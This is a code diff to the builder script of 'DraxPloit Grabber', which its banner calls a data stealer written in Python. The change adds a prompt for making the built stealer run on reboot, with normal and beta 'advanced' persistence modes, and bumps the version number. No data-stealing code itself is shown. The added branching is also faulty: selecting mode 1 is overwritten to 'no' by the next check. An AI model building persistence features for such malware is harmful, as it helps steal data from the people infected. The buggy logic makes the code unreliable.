@@ -31,7 +31,15 @@ class Builder:
 
         self.startup = input(f'[{Fore.GREEN}FEATURE{Fore.RESET}] File executes on reboot? (yes/no): ')
         if self.startup.lower() == 'y' or self.startup.lower() == 'yes':
-            self.startup = "yes"
+            self.startup2 = input(f'  [{Fore.GREEN}FEATURE{Fore.RESET}] Normal mode (1)\n  [{Fore.GREEN}BETA FEATURE{Fore.RESET}] Advanced mode (2)\n  {Fore.GREEN}Choose:{Fore.RESET} ')
+            if self.startup2.lower() == '1':
+                self.startup = "1"
+            else:
+                self.startup = "no"
+            if self.startup2.lower() == '2':
+                self.startup = "2"
+            else:
+                self.startup = "no"
         else:
             self.startup = "no"
 
@@ -120,7 +128,7 @@ class Builder:
                             .cdk0OO0OOOOOOOOOOOOOOOOkdc.                            
                           .:dk0O00O0OOOOOOOOOOOOOOOOO0Odc.                          
                         .:dk0O00OO0OOOOOOOOOOOOOOOOOO00OOdc.                     
-                      .:dOOOOOOOOOOOOOOO0OO00OOOOOOOO00OO0Odc.          DraxPloit Grabber v1.6         
+                      .:dOOOOOOOOOOOOOOO0OO00OOOOOOOO00OO0Odc.          DraxPloit Grabber v1.61         
                     .:dO00OOOOOOOOOOOO0O0OOOOOOOOOOOO00O0O00Odc.        Data Stealer written in Python           
                     ,k0O0OO00OO0OOO000000OOo:;,,,,ck00000OOOO0k,                    
                     ,k0OOOO000000OOOOO00Oo;.       'cx000OOO00k,          
